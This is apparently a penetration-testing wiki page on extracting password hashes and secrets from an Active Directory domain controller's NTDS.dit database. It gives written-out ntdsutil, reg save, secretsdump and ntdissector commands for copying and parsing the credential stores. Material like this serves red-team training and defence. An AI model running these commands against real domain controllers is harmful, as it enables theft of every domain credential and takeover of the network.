---
icon: user-secret
---

# NTDS Secret Extraction

## Theory

### NTDS Secret

NTDS (Windows NT Directory Services) is the directory services used by Microsoft Windows NT to locate, manage, and organize network resources. The NTDS.dit file is a database that stores the Active Directory data (including users, groups, security descriptors and password hashes). This file is stored on the domain controllers.

Once the secrets are extracted, they can be used for various attacks: [credential spraying](https://www.thehacker.recipes/a-d/movement/credentials/bruteforcing/password-spraying), [stuffing](https://www.thehacker.recipes/a-d/movement/credentials/bruteforcing/stuffing), [shuffling](https://www.thehacker.recipes/a-d/movement/credentials/shuffling), [cracking](https://www.thehacker.recipes/a-d/movement/credentials/cracking), [pass-the-hash](https://www.thehacker.recipes/a-d/movement/ntlm/pth), [overpass-the-hash](https://www.thehacker.recipes/a-d/movement/kerberos/ptk) or [silver or golden tickets](https://www.thehacker.recipes/a-d/movement/kerberos/forged-tickets).



***

## Practical

### Exfiltration

Since the NTDS.dit is constantly used by AD processes such as the Kerberos KDC, it can't be copied like any other file. In order to exfiltrate it from a live domain controller and extract password hashes from it, many techniques can be used.

Just like with [SAM & LSA secrets](https://www.thehacker.recipes/a-d/movement/credentials/dumping/sam-and-lsa-secrets), the SYSTEM registry hive contains enough info to decrypt the NTDS.dit data. The hive file (`\system32\config\system`) can either be exfiltrated the same way the NTDS.dit file is, or it can be exported with `reg save HKLM\SYSTEM 'C:\Windows\Temp\system.save'`.

### AD Maintenance (NTDSUtil)

NTDSUtil.exe is a diagnostic tool available as part of Active Directory. It has the ability to save a snapshot of the Active Directory data. Running the following command will copy the NTDS.dit database and the SYSTEM and SECURITY hives to `C:\Windows\Temp`.

```
ntdsutil "activate instance ntds" "ifm" "create full C:\Windows\Temp\NTDS" quit quit
```

The following files can then be exported

* `C:\Windows\Temp\NTDS\Active Directory\ntds.dit`
* `C:\Windows\Temp\NTDS\registry\SYSTEM`

{% hint style="info" %}
If the NTDS database is very large (several gigabytes), the generation of a defragmented backup with ntdsutil consumes a lot of CPU and disk resources on the server, which can cause slowdowns and other undesirable effects on the domain controller.
{% endhint %}

### Secrets Dump

Once the required files are exfiltrated, they can be parsed by tools like [secretsdump](https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py) (Python, part of [Impacket](https://github.com/SecureAuthCorp/impacket/)) or [gosecretsdump](https://github.com/c-sto/gosecretsdump) (Go, faster for big files).

```
secretsdump -ntds ntds.dit.save -system system.save LOCAL
gosecretsdump -ntds ntds.dit.save -system system.save
```

#### [Impackt's Secretsdump.py](https://github.com/fortra/impacket/blob/master/examples/secretsdump.py)

```
./secretsdump.py -ntds ~/Downloads/regbackup/ntds.dit -system ~/Downloads/regback/SYSTEM LOCAL
```

<figure><img src="../../../.gitbook/assets/image (10).png" alt=""><figcaption><p>Impacket's Secretsdump Output</p></figcaption></figure>

#### [Ntdissector](https://github.com/synacktiv/ntdissector)

```
# Dump users, groups and domain backup keys
ntdissector -ntds NTDS.dit -system SYSTEM -outputdir /tmp/ntdissector/ -ts -f user,group,secret

# Dump all records from the database
ntdissector -ntds NTDS.dit -system SYSTEM -outputdir /tmp/ntdissector/ -ts -f all
```

<figure><img src="../../../.gitbook/assets/image (11).png" alt=""><figcaption><p>Ntdissector's Output</p></figcaption></figure>

***

## REFERENCES

* [https://www.thehacker.recipes/a-d/movement/credentials/dumping/ntds](https://www.thehacker.recipes/a-d/movement/credentials/dumping/ntds)
* [https://www.hackingarticles.in/credential-dumping-ntds-dit/](https://www.hackingarticles.in/credential-dumping-ntds-dit/)
* [https://github.com/synacktiv/ntdissector](https://github.com/synacktiv/ntdissector)
* [https://github.com/fortra/impacket/blob/master/examples/secretsdump.py](https://github.com/fortra/impacket/blob/master/examples/secretsdump.py)

